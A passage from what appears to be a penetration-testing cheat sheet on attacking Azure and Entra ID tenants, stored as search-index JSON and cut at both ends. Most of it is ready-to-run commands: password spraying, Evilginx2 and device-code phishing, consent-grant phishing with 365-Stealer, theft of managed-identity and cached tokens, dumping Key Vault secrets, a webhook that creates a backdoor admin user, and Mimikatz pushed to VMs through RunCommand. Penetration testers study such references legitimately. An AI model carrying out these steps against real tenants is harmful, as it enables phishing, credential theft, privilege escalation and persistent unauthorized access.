</ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#password-spraying","title":"Password spraying","text":"<pre><code>PS&gt; . C:\\Tools\\MSOLSpray\\MSOLSpray.ps1\nPS&gt; Invoke-MSOLSpray -UserList C:\\Tools\\validemails.txt -Password &lt;PASSWORD&gt; -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-azure-subdomains","title":"Enumerate Azure Subdomains","text":"<pre><code>PS&gt; . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureSubDomains.ps1\nPS&gt; Invoke-EnumerateAzureSubDomains -Base &lt;TENANT NAME&gt; -Verbose\nSubdomain Service\n--------- -------\n&lt;TENANT NAME&gt;.mail.protection.outlook.com Email\n&lt;TENANT NAME&gt;.onmicrosoft.com Microsoft Hosted Domain\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-tenant-with-azure-ad-powershell","title":"Enumerate tenant with Azure AD Powershell","text":"<pre><code>Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1\nImport-Module C:\\Tools\\AzureADPreview\\AzureADPreview.psd1\nPS&gt; $passwd = ConvertTo-SecureString \"&lt;PASSWORD&gt;\" -AsPlainText -Force\nPS&gt; $creds = New-Object System.Management.Automation.PSCredential(\"test@&lt;TENANT NAME&gt;.onmicrosoft.com\", $passwd)\nPS Az&gt; Connect-AzureAD -Credential $creds\nPS AzureAD&gt; Get-AzureADUser -All $true\nPS AzureAD&gt; Get-AzureADUser -All $true | select UserPrincipalName\nPS AzureAD&gt; Get-AzureADGroup -All $true\nPS AzureAD&gt; Get-AzureADDevice\nPS AzureAD&gt; Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Administrator'\" | Get-AzureADDirectoryRoleMember\nPS AzureADPreview&gt; Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-tenant-with-az-powershell","title":"Enumerate tenant with Az Powershell","text":"<pre><code>PS&gt; $passwd = ConvertTo-SecureString \"&lt;PASSWORD&gt;\" -AsPlainText -Force\nPS&gt; $creds = New-Object System.Management.Automation.PSCredential (\"test@&lt;TENANT NAME&gt;.onmicrosoft.com\", $passwd)\nPS Az&gt; Connect-AzAccount -Credential $creds\nPS Az&gt; Get-AzResource\nPS Az&gt; Get-AzRoleAssignment -SignInName test@&lt;TENANT NAME&gt;.onmicrosoft.com\nPS Az&gt; Get-AzVM | fl\nPS Az&gt; Get-AzWebApp | ?{$_.Kind -notmatch \"functionapp\"}\nPS Az&gt; Get-AzFunctionApp\nPS Az&gt; Get-AzStorageAccount | fl\nPS Az&gt; Get-AzKeyVault\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-tenant-with-az-cli","title":"Enumerate tenant with az cli","text":"<pre><code>PS&gt; az login -u test@&lt;TENANT NAME&gt;.onmicrosoft.com -p &lt;PASSWORD&gt;\nPS&gt; az vm list\nPS&gt; az vm list --query \"[].[name]\" -o table\nPS&gt; az webapp list\nPS&gt; az functionapp list --query \"[].[name]\" -o table\nPS&gt; az storage account list\nPS&gt; az keyvault list\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-manually","title":"Enumerate manually","text":"<ul> <li>Federation with Azure AD or O365     <pre><code>https://login.microsoftonline.com/getuserrealm.srf?login=&lt;USER&gt;@&lt;DOMAIN&gt;&amp;xml=1\nhttps://login.microsoftonline.com/getuserrealm.srf?login=root@&lt;TENANT NAME&gt;.onmicrosoft.com&amp;xml=1\n</code></pre></li> <li>Get the Tenant ID     <pre><code>https://login.microsoftonline.com/&lt;DOMAIN&gt;/.well-known/openid-configuration\nhttps://login.microsoftonline.com/&lt;TENANT NAME&gt;.onmicrosoft.com/.well-known/openid-configuration\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumeration-methodology","title":"Enumeration methodology","text":"<pre><code># Check Azure Joined \nPS&gt; dsregcmd.exe /status\n+----------------------------------------------------------------------+\n| Device State |\n+----------------------------------------------------------------------+\nAzureAdJoined : YES\nEnterpriseJoined : NO\nDomainJoined : NO\nDevice Name : jumpvm\n# Enumerate resources\nPS Az&gt; Get-AzResource\n# Enumerate role assignments\nPS Az&gt; Get-AzRoleAssignment -Scope /subscriptions/&lt;SUBSCRIPTION-ID&gt;/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/&lt;VM-NAME&gt;`\n# Get info on a role\nPS Az&gt; Get-AzRoleDefinition -Name \"Virtual Machine Command Executor\"\n# Get info user\nPS AzureAD&gt; Get-AzureADUser -ObjectId &lt;ID&gt;\nPS AzureAD&gt; Get-AzureADUser -ObjectId test@&lt;TENANT NAME&gt;.onmicrosoft.com | fl * \n# List all groups\nPS AzureAD&gt; Get-AzureADGroup -All $true\n# Get members of a group\nPS Az&gt; Get-AzADGroup -DisplayName '&lt;GROUP-NAME&gt;'\nPS Az&gt; Get-AzADGroupMember -GroupDisplayName '&lt;GROUP-NAME&gt;' | select UserPrincipalName\n# Get Azure AD information\nPS&gt; Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1\nPS AADInternals&gt; Get-AADIntLoginInformation -UserName admin@&lt;TENANT NAME&gt;.onmicrosoft.com\nPS AADInternals&gt; Get-AADIntTenantID -Domain &lt;TENANT NAME&gt;.onmicrosoft.com # Get Tenant ID\nPS AADInternals&gt; Invoke-AADIntReconAsOutsider -DomainName &lt;DOMAIN&gt; # Get all the information\n# Check if there is a user logged-in to az cli\nPS&gt; az ad signed-in-user show\n# Check AppID Alternative Names/Display Name \nPS AzureAD&gt; Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq \"&lt;APP-ID&gt;\"} | fl\n# Get all application objects registered using the current tenant\nPS AzureAD&gt; Get-AzureADApplication -All $true\n# Get all details about an application\nPS AzureAD&gt; Get-AzureADApplication -ObjectId &lt;ID&gt; | fl *\n# List all VM's the user has access to\nPS Az&gt; Get-AzVM \nPS Az&gt; Get-AzVM | fl\n# Get all function apps\nPS Az&gt; Get-AzFunctionApp\n# Get all webapps\nPS Az&gt; Get-AzWebApp\nPS Az&gt; Get-AzWebApp | select-object Name, Type, Hostnames\n# List all storage accounts\nPS Az&gt; Get-AzStorageAccount\nPS Az&gt; Get-AzStorageAccount | fl\n# List all keyvaults\nPS Az&gt; Get-AzKeyVault\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#phishing-with-evilginx2","title":"Phishing with Evilginx2","text":"<pre><code>PS C:\\Tools&gt; evilginx2 -p C:\\Tools\\evilginx2\\phishlets\n: config domain username.corp\n: config ip 10.10.10.10\n: phishlets hostname o365 login.username.corp\n: phishlets get-hosts o365\nCreate a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine\n# copy certificate and enable the phishing\nPS C:\\Tools&gt; Copy-Item C:\\Users\\Username\\.evilginx\\crt\\ca.crt C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.crt\nPS C:\\Tools&gt; Copy-Item C:\\Users\\Username\\.evilginx\\crt\\private.key C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.key\n: phishlets enable o365\n# get the phishing URL\n: lures create o365\n: lures get-url 0\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#illicit-consent-grant","title":"Illicit Consent Grant","text":"<p>The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. </p> <p>Check if users are allowed to consent to apps: <code>PS AzureADPreview&gt; (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole</code> * Disable user consent : Users cannot grant permissions to applications. * Users can consent to apps from verified publishers or your organization, but only for permissions you select : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant * Users can consent to all apps : allows all users to consent to any permission which doesn't require admin consent, * Custom app consent policy</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#register-application","title":"Register Application","text":"<ol> <li>Login to https://portal.azure.com &gt; Azure Active Directory</li> <li>Click on App registrations &gt; New registration</li> <li>Enter the Name for our application</li> <li>Under support account types select \"Accounts in any organizational directory (Any Azure AD directory - Multitenant)\"</li> <li>Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is <code>https://&lt;DOMAIN/IP&gt;:&lt;PORT&gt;/login/authorized</code>.</li> <li>Click Register and save the Application ID</li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#configure-application","title":"Configure Application","text":"<ol> <li>Click on <code>Certificates &amp; secrets</code></li> <li>Click on <code>New client secret</code> then enter the Description and click on Add.</li> <li>Save the secret's value.</li> <li>Click on API permissions &gt; Add a permission</li> <li>Click on Microsoft Graph &gt; Delegated permissions</li> <li>Search and select the below mentioned permissions and click on Add permission<ul> <li>Contacts.Read </li> <li>Mail.Read / Mail.ReadWrite</li> <li>Mail.Send</li> <li>Notes.Read.All</li> <li>Mailboxsettings.ReadWrite</li> <li>Files.ReadWrite.All </li> <li>User.ReadBasic.All</li> <li>User.Read</li> </ul> </li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#setup-365-stealer-deprecated","title":"Setup 365-Stealer (Deprecated)","text":"<p> Default port for 365-Stealer phishing is 443</p> <ul> <li>Run XAMPP and start Apache</li> <li>Clone 365-Stealer into <code>C:\\xampp\\htdocs\\</code><ul> <li><code>git clone https://github.com/AlteredSecurity/365-Stealer.git</code></li> </ul> </li> <li>Install the requirements<ul> <li>Python3</li> <li>PHP CLI or Xampp server</li> <li><code>pip install -r requirements.txt</code></li> </ul> </li> <li>Enable sqlite3 (Xampp &gt; Apache config &gt; php.ini) and restart Apache</li> <li>Edit <code>C:/xampp/htdocs/yourvictims/index.php</code> if needed<ul> <li>Disable IP whitelisting <code>$enableIpWhiteList = false;</code></li> </ul> </li> <li>Go to 365-Stealer Management portal &gt; Configuration (http://localhost:82/365-stealer/yourVictims)<ul> <li>Client Id (Mandatory): This will be the Application(Client) Id of the application that we registered.</li> <li>Client Secret (Mandatory): Secret value from the Certificates &amp; secrets tab that we created.</li> <li>Redirect URL (Mandatory): Specify the redirect URL that we entered during registering the App like <code>https://&lt;Domain/IP&gt;/login/authorized</code> </li> <li>Macros Location: Path of macro file that we want to inject.</li> <li>Extension in OneDrive: We can provide file extensions that we want to download from the victims account or provide <code>*</code> to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. </li> <li>Delay: Delay the request by specifying time in seconds while stealing</li> </ul> </li> <li>Create a Self Signed Certificate to use HTTPS</li> <li>Run the application either click on the button or run this command : <code>python 365-Stealer.py --run-app</code><ul> <li><code>--no-ssl</code>: disable HTTPS</li> <li><code>--port</code>: change the default listening port</li> <li><code>--token</code>: provide a specific token</li> <li><code>--refresh-token XXX --client-id YYY --client-secret ZZZ</code>: use a refresh token</li> </ul> </li> <li>Find the Phishing URL: go to <code>https://&lt;IP/Domain&gt;:&lt;Port&gt;</code> and click on Read More button or in the console.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#setup-vajra","title":"Setup Vajra","text":"<p>Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target's Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra</p> <p>Mitigation: Enable <code>Do not allow user consent</code> for applications in the \"Consent and permissions menu\".</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#device-code-phish","title":"Device Code Phish","text":"<p>Requirements: * Azure AD / Office 365 E3 Subscription</p> <p>Exploitation:</p> <ul> <li>Import TokenTactics: <code>PS C:\\TokenTactics&gt; Import-Module .\\TokenTactics.psd1</code></li> <li>Request a device code for the Azure Graph API using TokenTactics: <code>Get-AzureToken -Client Graph</code></li> <li>Replace <code>&lt;REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS&gt;</code> in the phishing email</li> <li>Leave TokenTactics running in the PowerShell window and send the phishing email</li> <li>Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form</li> <li>Enjoy your Access Token &amp; Refresh Token</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#token-from-managed-identity","title":"Token from Managed Identity","text":"<p>MSI_ENDPOINT is an alias for IDENTITY_ENDPOINT, and MSI_SECRET is an alias for IDENTITY_HEADER.</p> <p>Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : <code>env</code></p> <p>Most of the time, you want a token for one of these resources:  * https://storage.azure.com * https://vault.azure.net * https://graph.microsoft.com * https://management.azure.com</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-api-via-powershell","title":"Azure API via Powershell","text":"<p>Get access_token from IDENTITY_HEADER and IDENTITY_ENDPOINT: <code>system('curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2017-09-01\" -H secret:$IDENTITY_HEADER');</code>. </p> <p>Then query the Azure REST API to get the subscription ID and more .</p> <pre><code>$Token = 'eyJ0eX..'\n$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'\n# $URI = 'https://graph.microsoft.com/v1.0/applications'\n$RequestParams = @{\nMethod = 'GET'\nUri = $URI\nHeaders = @{\n'Authorization' = \"Bearer $Token\"\n}\n}\n(Invoke-RestMethod @RequestParams).value \n# List resources and check for runCommand privileges\n$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'\n$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/&lt;RG-NAME&gt;/providers/Microsoft.Compute/virtualMachines/&lt;RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-api-via-python-version","title":"Azure API via Python Version","text":"<pre><code>IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']\nIDENTITY_HEADER = os.environ['IDENTITY_HEADER']\nprint(\"[+] Management API\")\ncmd = 'curl \"%s?resource=https://management.azure.com/&amp;api-version=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)\nval = os.popen(cmd).read()\nprint(\"Access Token: \"+json.loads(val)[\"access_token\"])\nprint(\"ClientID/AccountID: \"+json.loads(val)[\"client_id\"])\nprint(\"\\r\\n[+] Graph API\")\ncmd = 'curl \"%s?resource=https://graph.microsoft.com/&amp;api-version=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)\nval = os.popen(cmd).read()\nprint(json.loads(val)[\"access_token\"])\nprint(\"ClientID/AccountID: \"+json.loads(val)[\"client_id\"])\n</code></pre> <p>or inside a Python Function:</p> <pre><code>import logging, os\nimport azure.functions as func\ndef main(req: func.HttpRequest) -&gt; func.HttpResponse:\nlogging.info('Python HTTP trigger function processed a request.')\nIDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']\nIDENTITY_HEADER = os.environ['IDENTITY_HEADER']\ncmd = 'curl \"%s?resource=https://management.azure.com&amp;apiversion=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)\nval = os.popen(cmd).read()\nreturn func.HttpResponse(val, status_code=200)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#get-tokens","title":"Get Tokens","text":"<p> The lifetime of a Primary Refresh Token is 14 days!</p> <pre><code># az cli - get tokens \naz account get-access-token \naz account get-access-token --resource-type aad-graph\n# or Az\n(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token\n# or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#use-tokens","title":"Use Tokens","text":"<p>Tokens contain all the claims including that for MFA and Conditional Access</p> <ul> <li>Az Powershell     <pre><code>PS C:\\Tools&gt; $token = 'eyJ0e..'\nPS C:\\Tools&gt; Connect-AzAccount -AccessToken $token -AccountId &lt;ACCOUNT-ID&gt;\n# Access Token and Graph Token\nPS C:\\Tools&gt; $token = 'eyJ0eX..'\nPS C:\\Tools&gt; $graphaccesstoken = 'eyJ0eX..'\nPS C:\\Tools&gt; Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId &lt;ACCOUNT-ID&gt;\nPS C:\\Tools&gt; Get-AzResource\n# ERROR: 'this.Client.SubscriptionId' cannot be null.\n# ---&gt; The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI\n</code></pre></li> <li>AzureAD     <pre><code>Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1\n$AADToken = 'eyJ0\u2026'\nConnect-AzureAD -AadAccessToken $AADToken -TenantId &lt;TENANT-ID&gt; -AccountId &lt;ACCOUNT-ID&gt;\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#refresh-tokens","title":"Refresh Tokens","text":"<ul> <li>https://github.com/ConstantinT/Lantern     <pre><code>Lantern.exe cookie --derivedkey &lt;Key from Mimikatz&gt; --context &lt;Context from Mimikatz&gt; --prt &lt;PRT from Mimikatz&gt;\nLantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename &lt;Name&gt; --outpfxfile &lt;Some path&gt;\nLantern.exe token --username &lt;Username&gt; --password &lt;Password&gt;\nLantern.exe token --refreshtoken &lt;RefreshToken&gt;\nLantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) \n</code></pre></li> <li>https://github.com/rvrsh3ll/TokenTactics     <pre><code>Import-Module .\\TokenTactics.psd1\nCommandType     Name                                               Version    Source\n-----------     ----                                               -------    ------\nFunction        Clear-Token                                        0.0.1      TokenTactics\nFunction        Dump-OWAMailboxViaMSGraphApi                       0.0.1      TokenTactics\nFunction        Forge-UserAgent                                    0.0.1      TokenTactics\nFunction        Get-AzureToken                                     0.0.1      TokenTactics\nFunction        Get-TenantID                                       0.0.1      TokenTactics\nFunction        Open-OWAMailboxInBrowser                           0.0.1      TokenTactics\nFunction        Parse-JWTtoken                                     0.0.1      TokenTactics\nFunction        RefreshTo-AzureCoreManagementToken                 0.0.1      TokenTactics\nFunction        RefreshTo-AzureManagementToken                     0.0.1      TokenTactics\nFunction        RefreshTo-DODMSGraphToken                          0.0.1      TokenTactics\nFunction        RefreshTo-GraphToken                               0.0.1      TokenTactics\nFunction        RefreshTo-MAMToken                                 0.0.1      TokenTactics\nFunction        RefreshTo-MSGraphToken                             0.0.1      TokenTactics\nFunction        RefreshTo-MSManageToken                            0.0.1      TokenTactics\nFunction        RefreshTo-MSTeamsToken                             0.0.1      TokenTactics\nFunction        RefreshTo-O365SuiteUXToken                         0.0.1      TokenTactics\nFunction        RefreshTo-OfficeAppsToken                          0.0.1      TokenTactics\nFunction        RefreshTo-OfficeManagementToken                    0.0.1      TokenTactics\nFunction        RefreshTo-OutlookToken                             0.0.1      TokenTactics\nFunction        RefreshTo-SubstrateToken                           0.0.1      TokenTactics\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#stealing-tokens","title":"Stealing Tokens","text":"<ul> <li>Get-AzurePasswords     <pre><code>Import-Module Microburst.psm1\nGet-AzurePasswords\nGet-AzurePasswords -Verbose | Out-GridView\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#stealing-tokens-from-az-cli","title":"Stealing tokens from az cli","text":"<ul> <li>az cli stores access tokens in clear text in accessTokens.json in the directory <code>C:\\Users\\&lt;username&gt;\\.Azure</code></li> <li>azureProfile.json in the same directory contains information about subscriptions.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#stealing-tokens-from-az-powershell","title":"Stealing tokens from az powershell","text":"<ul> <li>Az PowerShell stores access tokens in clear text in TokenCache.dat in the directory <code>C:\\Users\\&lt;username&gt;\\.Azure</code></li> <li>It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json </li> <li>Users can save tokens using <code>Save-AzContext</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#add-credentials-to-all-enterprise-applications","title":"Add credentials to all Enterprise Applications","text":"<pre><code># Add secrets\nPS &gt; . C:\\Tools\\Add-AzADAppSecret.ps1\nPS &gt; Add-AzADAppSecret -GraphToken $graphtoken -Verbose\n# Use secrets to authenticate as Service Principal\nPS &gt; $password = ConvertTo-SecureString '&lt;SECRET/PASSWORD&gt;' -AsPlainText -Force\nPS &gt; $creds = New-Object System.Management.Automation.PSCredential('&lt;AppID&gt;', $password)\nPS &gt; Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '&lt;TenantID&gt;'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#spawn-ssh-for-azure-web-app","title":"Spawn SSH for Azure Web App","text":"<pre><code>az webapp create-remote-connection --subscription &lt;SUBSCRIPTION-ID&gt; --resource-group &lt;RG-NAME&gt; -n &lt;APP-SERVICE-NAME&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-storage-blob","title":"Azure Storage Blob","text":"<ul> <li>Blobs - <code>*.blob.core.windows.net</code></li> <li>File Services - <code>*.file.core.windows.net</code></li> <li>Data Tables - <code>*.table.core.windows.net</code></li> <li>Queues - <code>*.queue.core.windows.net</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-blobs","title":"Enumerate blobs","text":"<pre><code>PS &gt; . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureBlobs.ps1\nPS &gt; Invoke-EnumerateAzureBlobs -Base &lt;SHORT DOMAIN&gt; -OutputFile azureblobs.txt\nFound Storage Account -  testsecure.blob.core.windows.net\nFound Storage Account -  securetest.blob.core.windows.net\nFound Storage Account -  securedata.blob.core.windows.net\nFound Storage Account -  securefiles.blob.core.windows.net\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#sas-url","title":"SAS URL","text":"<ul> <li>Use Storage Explorer</li> <li>Click on Open Connect Dialog in the left menu. </li> <li>Select Blob container. </li> <li>On the Select Authentication Method page<ul> <li>Select Shared access signature (SAS) and click on Next</li> <li>Copy the URL in Blob container SAS URL field.</li> </ul> </li> </ul> <p> You can also use <code>subscription</code>(username/password) to access storage resources such as blobs and files.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#list-and-download-blobs","title":"List and download blobs","text":"<pre><code>PS Az&gt; Get-AzResource\nPS Az&gt; Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;\nPS Az&gt; Get-AzStorageContainer -Context (Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;).context\nPS Az&gt; Get-AzStorageBlobContent -Container &lt;NAME&gt; -Context (Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;).context -Blob\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#runbook-automation","title":"Runbook Automation","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#create-a-runbook","title":"Create a Runbook","text":"<pre><code># Check user right for automation\naz extension add --upgrade -n automation\naz automation account list # if it doesn't return anything the user is not a part of an Automation group\naz ad signed-in-user list-owned-objects\n# If the user is not part of an \"Automation\" group.\n# Add him to a custom group , e.g: \"Automation Admins\"\nAdd-AzureADGroupMember -ObjectId &lt;OBJID&gt; -RefObjectId &lt;REFOBJID&gt; -Verbose\n# Get the role of a user on the Automation account\n# Contributor or higher = Can create and execute Runbooks\nGet-AzRoleAssignment -Scope /subscriptions/&lt;ID&gt;/resourceGroups/&lt;RG-NAME&gt;/providers/Microsoft.Automation/automationAccounts/&lt;AUTOMATION-ACCOUNT&gt;\n# List hybrid workers\nGet-AzAutomationHybridWorkerGroup -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt;\n# Create a Powershell Runbook\nPS C:\\Tools&gt; Import-AzAutomationRunbook -Name &lt;RUNBOOK-NAME&gt; -Path C:\\Tools\\username.ps1 -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Type PowerShell -Force -Verbose\n# Publish the Runbook\nPublish-AzAutomationRunbook -RunbookName &lt;RUNBOOK-NAME&gt; -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Verbose\n# Start the Runbook\nStart-AzAutomationRunbook -RunbookName &lt;RUNBOOK-NAME&gt; -RunOn Workergroup1 -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#persistence-via-automation-accounts","title":"Persistence via Automation accounts","text":"<ul> <li>Create a new Automation Account<ul> <li>\"Create Azure Run As account\": Yes</li> </ul> </li> <li>Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*<ul> <li>Sample runbook for this Blog located here \u2013 https://github.com/NetSPI/MicroBurst</li> <li>Publish the runbook</li> <li>Add a webhook to the runbook</li> </ul> </li> <li>Add the AzureAD module to the Automation account<ul> <li>Update the Azure Automation Modules</li> </ul> </li> <li>Assign \"User Administrator\" and \"Subscription Owner\" rights to the automation account</li> <li>Eventually lose your access\u2026</li> <li>Trigger the webhook with a post request to create the new user     <pre><code>$uri = \"https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d\"\n$AccountInfo  = @(@{RequestBody=@{Username=\"BackdoorUsername\";Password=\"BackdoorPassword\"}})\n$body = ConvertTo-Json -InputObject $AccountInfo\n$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#virtual-machine-runcommand","title":"Virtual Machine RunCommand","text":"<p>Requirements:  * <code>Microsoft.Compute/virtualMachines/runCommand/action</code></p> <pre><code># Get Public IP of VM : query the network interface\nPS AzureAD&gt; Get-AzVM -Name &lt;RESOURCE&gt; -ResourceGroupName &lt;RG-NAME&gt; | select -ExpandProperty NetworkProfile\nPS AzureAD&gt; Get-AzNetworkInterface -Name &lt;RESOURCE368&gt;\nPS AzureAD&gt; Get-AzPublicIpAddress -Name &lt;RESOURCEIP&gt;\n# Execute Powershell script on the VM\nPS AzureAD&gt; Invoke-AzVMRunCommand -VMName &lt;RESOURCE&gt; -ResourceGroupName &lt;RG-NAME&gt; -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\Tools\\adduser.ps1' -Verbose\n# Connect via WinRM\nPS C:\\Tools&gt; $password = ConvertTo-SecureString '&lt;PASSWORD&gt;' -AsPlainText -Force\nPS C:\\Tools&gt; $creds = New-Object System.Management.Automation.PSCredential('username', $Password)\nPS C:\\Tools&gt; $sess = New-PSSession -ComputerName &lt;IP&gt; -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)\nPS C:\\Tools&gt; Enter-PSSession $sess\n</code></pre> <p>Allow anyone with \"Contributor\" rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\\System</p> <pre><code># List available VMs\nPS C:\\&gt; Get-AzureRmVM -status | where {$_.PowerState -EQ \"VM running\"} | select ResourceGroupName,Name\nResourceGroupName    Name       \n-----------------    ----       \nTESTRESOURCES        Remote-Test\n# Execute Powershell script on the VM\nPS C:\\&gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1\n</code></pre> <p>Against the whole subscription using MicroBurst.ps1</p> <pre><code>Import-module MicroBurst.psm1\nInvoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#keyvault-secrets","title":"KeyVault Secrets","text":"<pre><code># keyvault access token\ncurl \"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&amp;apiversion=2017-09-01\" -H secret:$IDENTITY_HEADER\ncurl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com&amp;apiversion=2017-09-01\" -H secret:$IDENTITY_HEADER\n# connect\nPS&gt; $token = 'eyJ0..'\nPS&gt; $keyvaulttoken = 'eyJ0..'\nPS Az&gt; Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken\n# query the vault and the secrets\nPS Az&gt; Get-AzKeyVault\nPS Az&gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault\nPS Az&gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#pass-the-prt","title":"Pass The PRT","text":"<p>MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the 